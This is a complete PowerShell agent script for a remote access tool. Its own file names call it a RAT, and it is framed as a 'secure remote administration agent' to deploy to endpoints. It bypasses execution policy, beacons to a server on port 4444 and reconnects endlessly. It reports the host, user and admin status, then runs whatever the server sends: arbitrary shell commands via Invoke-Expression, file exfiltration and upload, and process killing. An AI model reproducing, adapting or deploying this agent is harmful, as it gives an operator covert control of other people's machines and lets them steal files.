# ============================================================
#  Secure Remote Administration Agent  —  agent.ps1
#
#  Configure the four variables below, then deploy to endpoints.
#  The PSK and CertThumbprint are printed by the server on startup
#  and saved to rat_psk.txt / rat_fingerprint.txt.
#
#  Run with:
#    powershell -ExecutionPolicy Bypass -File agent.ps1
# ============================================================

$ServerHost      = "127.0.0.1"        # <-- Server IP / hostname
$ServerPort      = 4444
$PSK             = "PASTE_PSK_HERE"   # <-- Pre-shared key from rat_psk.txt
$CertThumbprint  = ""                 # <-- SHA-256 fingerprint from rat_fingerprint.txt
                                      #     Leave empty to skip cert pinning (less secure)
$UseTLS          = $true              # Set $false only if server was started with --no-tls
$ReconnectSecs   = 10


# ─────────────────────────────────────────────────────────────
#  Protocol helpers  (4-byte LE length prefix + UTF-8 JSON)
# ─────────────────────────────────────────────────────────────

function Send-Msg {
    param($Stream, [hashtable]$Data)
    $json  = $Data | ConvertTo-Json -Compress -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $len   = [System.BitConverter]::GetBytes([int32]$bytes.Length)
    $Stream.Write($len,   0, 4)
    $Stream.Write($bytes, 0, $bytes.Length)
    $Stream.Flush()
}

function Recv-Msg {
    param($Stream)
    $hdr = New-Object byte[] 4
    $got = 0
    while ($got -lt 4) {
        $n = $Stream.Read($hdr, $got, 4 - $got)
        if ($n -eq 0) { return $null }
        $got += $n
    }
    $len = [System.BitConverter]::ToInt32($hdr, 0)
    if ($len -le 0 -or $len -gt (50 * 1024 * 1024)) { return $null }   # 50 MB cap
    $buf = New-Object byte[] $len
    $got = 0
    while ($got -lt $len) {
        $n = $Stream.Read($buf, $got, $len - $got)
        if ($n -eq 0) { return $null }
        $got += $n
    }
    $json = [System.Text.Encoding]::UTF8.GetString($buf)
    try { return $json | ConvertFrom-Json } catch { return $null }
}

# ─────────────────────────────────────────────────────────────
#  SECURITY: HMAC-SHA256 authentication
#  Computes HMAC-SHA256(PSK, nonce_bytes) as a hex string.
#  The server sends a random nonce; we prove we know the PSK
#  without ever transmitting the PSK itself.
# ─────────────────────────────────────────────────────────────

function Compute-HMAC {
    param([string]$Key, [string]$NonceHex)
    $keyBytes   = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $nonceBytes = New-Object byte[] ($NonceHex.Length / 2)
    for ($i = 0; $i -lt $NonceHex.Length; $i += 2) {
        $nonceBytes[$i / 2] = [Convert]::ToByte($NonceHex.Substring($i, 2), 16)
    }
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $keyBytes
    $hash = $hmac.ComputeHash($nonceBytes)
    $hmac.Dispose()
    return ($hash | ForEach-Object { $_.ToString("x2") }) -join ""
}

# ─────────────────────────────────────────────────────────────
#  SECURITY: TLS stream with optional cert-pinning
#  Cert pinning verifies the server is presenting the exact
#  certificate we expect, defeating MITM attacks even when
#  using a self-signed cert that isn't in the OS trust store.
# ─────────────────────────────────────────────────────────────

function Get-SecureStream {
    param($TcpClient)

    $rawStream = $TcpClient.GetStream()
    if (-not $UseTLS) { return $rawStream }

    $validationCallback = {
        param($sender, $certificate, $chain, $sslPolicyErrors)
        if ($CertThumbprint -ne "") {
            # Cert pinning: compare SHA-256 thumbprint regardless of chain trust
            $actual = $certificate.GetCertHashString("SHA256")
            return ($actual -ieq $CertThumbprint)
        }
        # No pinning configured — accept any cert (less secure, but still encrypted)
        return $true
    }

    $sslStream = New-Object System.Net.Security.SslStream(
        $rawStream, $false, $validationCallback
    )
    try {
        $sslStream.AuthenticateAsClient($ServerHost)
        return $sslStream
    } catch {
        $sslStream.Dispose()
        return $null
    }
}

# ─────────────────────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────────────────────

function Get-LocalIP {
    try {
        $addrs = [System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) |
                 Where-Object { $_.AddressFamily -eq 'InterNetwork' -and
                                $_.ToString() -ne '127.0.0.1' }
        if ($addrs) { return $addrs[0].ToString() }
    } catch {}
    return "Unknown"
}

# ─────────────────────────────────────────────────────────────
#  Main reconnect loop
# ─────────────────────────────────────────────────────────────

while ($true) {
    $client = $null
    $stream = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ServerHost, $ServerPort)

        # SECURITY: upgrade to TLS (with optional cert pinning)
        $stream = Get-SecureStream -TcpClient $client
        if ($null -eq $stream) {
            throw "TLS handshake failed"
        }

        # SECURITY: HMAC challenge/response
        $challenge = Recv-Msg -Stream $stream
        if ($null -eq $challenge -or $challenge.type -ne "challenge") {
            throw "Expected challenge, got: $($challenge.type)"
        }
        $hmacValue = Compute-HMAC -Key $PSK -NonceHex $challenge.nonce
        Send-Msg -Stream $stream -Data @{ type = "auth"; hmac = $hmacValue }

        $authResp = Recv-Msg -Stream $stream
        if ($null -eq $authResp -or $authResp.type -ne "auth_ok") {
            throw "Authentication failed — check PSK"
        }

        # Registration
        $osInfo = $null
        $csInfo = $null
        try { $osInfo = Get-WmiObject Win32_OperatingSystem -ErrorAction Stop } catch {}
        try { $csInfo = Get-WmiObject Win32_ComputerSystem  -ErrorAction Stop } catch {}

        $reg = @{
            type     = "register"
            hostname = $env:COMPUTERNAME
            username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            os       = if ($osInfo) { $osInfo.Caption } else { "Windows" }
            arch     = if ($osInfo) { $osInfo.OSArchitecture } else { $env:PROCESSOR_ARCHITECTURE }
            ip       = Get-LocalIP
            ps_ver   = $PSVersionTable.PSVersion.ToString()
            is_admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
                           [Security.Principal.WindowsBuiltInRole]::Administrator)
        }
        Send-Msg -Stream $stream -Data $reg

        # ── Command loop ──────────────────────────────────────
        while ($true) {
            $msg = Recv-Msg -Stream $stream
            if ($null -eq $msg) { break }

            $resp = @{ type = "response"; id = $msg.id; status = "ok"; output = "" }

            switch ($msg.command) {

                "shell" {
                    try {
                        $out = Invoke-Expression ($msg.args) 2>&1 | Out-String
                        $resp.output = $out
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "sysinfo" {
                    try {
                        $up = "N/A"
                        if ($osInfo) {
                            $boot = $osInfo.ConvertToDateTime($osInfo.LastBootUpTime)
                            $span = (Get-Date) - $boot
                            $up   = "{0}d {1}h {2}m" -f [int]$span.TotalDays, $span.Hours, $span.Minutes
                        }
                        $ramGB = if ($csInfo) { [math]::Round($csInfo.TotalPhysicalMemory / 1GB, 2) } else { "N/A" }
                        $info = [ordered]@{
                            hostname = $env:COMPUTERNAME
                            username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                            os       = if ($osInfo) { $osInfo.Caption }            else { "Windows" }
                            arch     = if ($osInfo) { $osInfo.OSArchitecture }     else { $env:PROCESSOR_ARCHITECTURE }
                            ram_gb   = $ramGB
                            uptime   = $up
                            cwd      = (Get-Location).Path
                            local_ip = Get-LocalIP
                            ps_ver   = $PSVersionTable.PSVersion.ToString()
                            is_admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
                                           [Security.Principal.WindowsBuiltInRole]::Administrator)
                        }
                        $resp.output = $info | ConvertTo-Json -Compress
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "ls" {
                    $path = if ($msg.args -and $msg.args -ne "") { $msg.args } else { "." }
                    try {
                        $items = Get-ChildItem -LiteralPath $path -Force -ErrorAction Stop |
                            Select-Object Name, Length, LastWriteTime,
                                @{ N = "Type"; E = { if ($_.PSIsContainer) { "dir" } else { "file" } } }
                        $resp.output = ($items | ConvertTo-Json -Compress)
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "cd" {
                    try {
                        Set-Location -LiteralPath $msg.args -ErrorAction Stop
                        $resp.output = (Get-Location).Path
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "ps" {
                    try {
                        $procs = Get-Process -ErrorAction Stop |
                            Select-Object Id, ProcessName,
                                @{ N = "CPU"; E = { if ($_.CPU) { [math]::Round($_.CPU, 2) } else { 0 } } },
                                @{ N = "RAM"; E = { [math]::Round($_.WorkingSet64 / 1MB, 1) } } |
                            Sort-Object ProcessName
                        $resp.output = ($procs | ConvertTo-Json -Compress)
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "kill" {
                    try {
                        Stop-Process -Id ([int]$msg.args) -Force -ErrorAction Stop
                        $resp.output = "Process $($msg.args) terminated."
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "download" {
                    try {
                        $bytes = [System.IO.File]::ReadAllBytes($msg.args)
                        $resp.output   = [Convert]::ToBase64String($bytes)
                        $resp.filename = [System.IO.Path]::GetFileName($msg.args)
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "upload" {
                    try {
                        $bytes = [Convert]::FromBase64String($msg.data)
                        [System.IO.File]::WriteAllBytes($msg.path, $bytes)
                        $resp.output = "Uploaded $($bytes.Length) bytes to $($msg.path)"
                    } catch {
                        $resp.status = "error"
                        $resp.output = $_.Exception.Message
                    }
                }

                "ping" {
                    $resp.output = "pong"
                }

                default {
                    $resp.status = "error"
                    $resp.output = "Unknown command: $($msg.command)"
                }
            }

            Send-Msg -Stream $stream -Data $resp
        }

    } catch {
        # Connection / auth error — will attempt reconnect
    } finally {
        if ($stream) { try { $stream.Dispose() } catch {} }
        if ($client) { try { $client.Close()   } catch {} }
    }

    Start-Sleep -Seconds $ReconnectSecs
}
